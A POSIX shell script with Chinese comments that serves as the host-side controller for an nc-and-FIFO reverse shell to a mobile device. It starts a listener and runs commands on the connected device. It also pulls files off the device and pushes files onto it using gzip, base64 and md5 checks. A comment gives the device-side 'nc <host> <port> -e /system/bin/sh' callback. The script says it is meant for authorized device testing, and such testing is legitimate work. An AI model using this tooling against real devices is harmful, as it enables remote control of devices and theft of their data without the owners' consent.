#!/bin/sh
# revshell.sh  [T9 / 主机侧反弹 shell 驱动器]
# 用途：管理「nc + fifo」反弹 shell 测试通道——建立/执行命令/双向传文件/拆除。
#       本工具固化第 1~9 轮真机测试的全部通道操作（偏移法防历史缓冲污染等坑已内置）。
# 通道模型：
#   设备侧：任意途径获得 `nc <host> <port> -e /system/bin/sh` 类反弹（或管道等价物）
#   主机侧：nc -l <port> < FIFO > OUTLOG，holder 进程常驻保持 fifo 不 EOF
# 安全：仅用于已授权设备测试；OUTLOG 含会话全部输出，注意敏感数据管控。
#
# 用法：
#   revshell.sh start [port]          # 建立监听（默认 9377），等待设备回连
#   revshell.sh status                # 通道存活检查
#   revshell.sh cmd 'ls /data'        # 执行命令，打印增量输出
#   revshell.sh get /remote/path ./local   # 拉文件（gzip+base64+md5 校验）
#   revshell.sh put ./local /remote/path   # 推文件（分块 base64，md5 校验）
#   revshell.sh stop                  # 拆除监听与 holder

PORT=${PORT:-9377}
BASE=/tmp/revshell_$$
[ -n "$REV_BASE" ] && BASE=$REV_BASE       # 可用环境变量固定会话目录
FIFO_IN=$BASE.in
OUTLOG=$BASE.out
PIDF=$BASE.pids

log() { echo "[RS] $*"; }
die() { log "错误: $*"; exit 1; }

# ---------- start：建立监听 ----------
do_start() {
    port=${1:-$PORT}
    mkdir -p "$(dirname "$OUTLOG")" 2>/dev/null
    rm -f "$FIFO_IN" "$OUTLOG"
    mkfifo "$FIFO_IN" || die "mkfifo 失败"
    # holder：常驻读端防 EOF（后台 sleep 持有 fifo 写端亦可，此处用 cat 保活）
    sleep 31536000 > "$FIFO_IN" &
    echo $! > "$PIDF"
    nc -l "$port" < "$FIFO_IN" >> "$OUTLOG" 2>&1 &
    echo $! >> "$PIDF"
    log "监听 0.0.0.0:$port  OUTLOG=$OUTLOG"
    log "等待设备回连（设备侧执行反向连接后，用 status 确认）"
}

# ---------- status ----------
do_status() {
    for p in $(cat "$PIDF" 2>/dev/null); do
        kill -0 "$p" 2>/dev/null || log "进程 $p 已退出"
    done
    if lsof -i :"$PORT" 2>/dev/null | grep -q LISTEN; then
        log "通道: 监听存活"
    fi
    if lsof -i :"$PORT" 2>/dev/null | grep -q ESTABLISHED; then
        log "通道: 已建立（设备已连）"
    else
        log "通道: 未连接"
    fi
}

# ---------- cmd：执行并取增量输出 ----------
# 关键设计：记录 OUTLOG 字节偏移，只取本次新增——避免历史缓冲污染（第 9 轮踩坑固化）
do_cmd() {
    cmd=$1; wait=${2:-4}
    [ -p "$FIFO_IN" ] || die "通道未建立（先 start）"
    off=$(stat -f%z "$OUTLOG" 2>/dev/null || echo 0)
    printf '%s\n' "$cmd" > "$FIFO_IN"
    sleep "$wait"
    tail -c +"$((off + 1))" "$OUTLOG"
}

# ---------- get：设备 → 主机（gzip+base64，md5 双端校验）----------
do_get() {
    remote=$1; local_out=$2
    [ -n "$remote" ] && [ -n "$local_out" ] || die "用法: get /remote/path ./local"
    # 设备侧 md5 基准
    rmd5=$(do_cmd "md5sum '$remote' | cut -d' ' -f1" 4 | tr -d '\r\n ')
    [ -n "$rmd5" ] || die "取设备 md5 失败（路径不存在或不可读）"
    mark="RS_GET_DONE_$$"
    off=$(stat -f%z "$OUTLOG" 2>/dev/null || echo 0)
    printf "gzip -c '%s' | base64; echo %s\n" "$remote" "$mark" > "$FIFO_IN"
    for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
        sleep 5
        tail -c +"$((off + 1))" "$OUTLOG" | grep -q "$mark" && break
    done
    tail -c +"$((off + 1))" "$OUTLOG" | sed -n "1,/$mark/p" | grep -v "$mark" | tr -d '\r' > "$BASE.b64"
    base64 -D -i "$BASE.b64" -o "$BASE.gz" 2>/dev/null || base64 -d "$BASE.b64" > "$BASE.gz"
    gunzip -c "$BASE.gz" > "$local_out" || die "gunzip 失败"
    lmd5=$(md5 -q "$local_out" 2>/dev/null || md5sum "$local_out" | cut -d' ' -f1)
    if [ "$lmd5" = "$rmd5" ]; then
        log "拉取成功 md5=$lmd5 → $local_out"
    else
        die "md5 不一致 设备=$rmd5 本机=$lmd5（重试或增大等待）"
    fi
}

# ---------- put：主机 → 设备（gzip+base64 分块）----------
do_put() {
    local_in=$1; remote=$2
    [ -f "$local_in" ] || die "本地文件不存在: $local_in"
    lmd5=$(md5 -q "$local_in" 2>/dev/null || md5sum "$local_in" | cut -d' ' -f1)
    gzip -c "$local_in" | base64 | split -b 60000 - "$BASE.chunk."
    for c in "$BASE.chunk."*; do
        printf "echo '%s' >> '%s.b64'\n" "$(cat "$c")" "$remote" > "$FIFO_IN"; sleep 3
    done
    printf "base64 -d < '%s.b64' | gunzip -c > '%s'; md5sum '%s'; rm -f '%s.b64'\n" \
        "$remote" "$remote" "$remote" "$remote" > "$FIFO_IN"
    sleep 6
    rmd5=$(tail -c 400 "$OUTLOG" | grep -oE '[0-9a-f]{32}' | tail -1)
    if [ "$rmd5" = "$lmd5" ]; then
        log "推送成功 md5=$lmd5 → $remote"
    else
        die "设备侧 md5 不匹配（期望 $lmd5 得到 ${rmd5:-空}），检查分块传输"
    fi
}

# ---------- stop ----------
do_stop() {
    for p in $(cat "$PIDF" 2>/dev/null); do kill "$p" 2>/dev/null; done
    rm -f "$FIFO_IN" "$BASE".chunk.* "$BASE.b64" "$BASE.gz" "$PIDF"
    log "通道已拆除（OUTLOG=$OUTLOG 保留供审计）"
}

case "${1:-}" in
    start)  do_start "$2" ;;
    status) do_status ;;
    cmd)    [ -n "$2" ] || die "用法: cmd '命令' [等待秒]"; do_cmd "$2" "${3:-4}" ;;
    get)    do_get "$2" "$3" ;;
    put)    do_put "$2" "$3" ;;
    stop)   do_stop ;;
    *)      sed -n '2,20p' "$0"; exit 1 ;;
esac
